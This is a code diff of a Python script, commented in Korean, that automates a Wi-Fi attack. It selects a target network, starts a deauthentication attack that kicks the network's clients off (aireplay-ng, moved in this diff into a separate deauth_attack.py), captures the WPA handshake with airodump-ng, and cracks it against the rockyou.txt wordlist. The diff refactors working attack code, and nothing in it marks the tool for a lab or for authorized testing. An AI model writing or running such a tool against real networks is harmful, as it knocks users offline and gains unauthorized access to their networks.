@@ -50,17 +50,16 @@ def parse_clients_csv(csv_filename):
         print(f"CSV 파일 '{csv_filename}'을 찾을 수 없습니다.")
     return clients
 
-# 디어소시에이션 공격
-def run_aireplay(bssid, interface, clients):
-    for client in clients:
-        aireplay_cmd = f"sudo aireplay-ng -0 0 -a {bssid} -c {client} {interface}"
-        subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', aireplay_cmd])
-
 # 핸드셰이크 캡처
 def capture_handshake(interface, bssid, channel):
-    airodump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w handshake {interface}"
-    subprocess.Popen(['gnome-terminal', '--', 'bash', '-c', airodump_cmd])
+    output_dir = 'output_files'
+    os.makedirs(output_dir, exist_ok=True)
+    airodump_cmd = ["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", f"{output_dir}/handshake", interface]
+    airodump_process = subprocess.Popen(airodump_cmd)
+    
+    return airodump_process
 
+# 비밀번호 크랙
 def crack_password(handshake_file, wordlist):
     if not os.path.isfile(wordlist):
         print(f"워드리스트 파일 '{wordlist}'을 찾을 수 없습니다.")
@@ -80,7 +79,9 @@ def main():
     else:
         selected_interface = choice
 
-    csv_filename_prefix = "output"
+    output_dir = 'output_files'
+    os.makedirs(output_dir, exist_ok=True)
+    csv_filename_prefix = f"{output_dir}/output"
     csv_filename = f"{csv_filename_prefix}-01.csv"
 
     print(f"airodump-ng를 실행합니다. 인터페이스: {selected_interface}")
@@ -116,15 +117,25 @@ def main():
         print(f"선택한 네트워크: BSSID: {bssid}, ESSID: {essid}, Channel: {channel}")
         
         clients = parse_clients_csv(csv_filename)
-        
-        # gnome-terminal을 사용하여 디어소시에이션 공격 및 핸드셰이크 캡처를 동시에 실행
-        run_aireplay(bssid, selected_interface, clients)
-        capture_handshake(selected_interface, bssid, channel)
+
+        # 디어소시에이션 공격을 위한 별도 스크립트 실행
+        deauth_script = f"gnome-terminal -- bash -c 'python3 deauth_attack.py {bssid} {selected_interface} {' '.join(clients)}; exec bash'"
+        subprocess.Popen(deauth_script, shell=True)
+
+        airodump_process = capture_handshake(selected_interface, bssid, channel)
 
         print("핸드셰이크를 캡처 중입니다. 60초 동안 기다립니다...")
         time.sleep(60)
 
-        handshake_file = "handshake-01.cap"
+        # airodump-ng 프로세스 종료
+        airodump_process.terminate()
+        try:
+            airodump_process.wait(timeout=10)
+        except subprocess.TimeoutExpired:
+            print("airodump-ng 프로세스가 종료되지 않았습니다. 강제 종료합니다.")
+            airodump_process.kill()
+
+        handshake_file = f"{output_dir}/handshake-01.cap"
         wordlist = "/usr/share/wordlists/rockyou.txt"
         crack_password(handshake_file, wordlist)
     else:
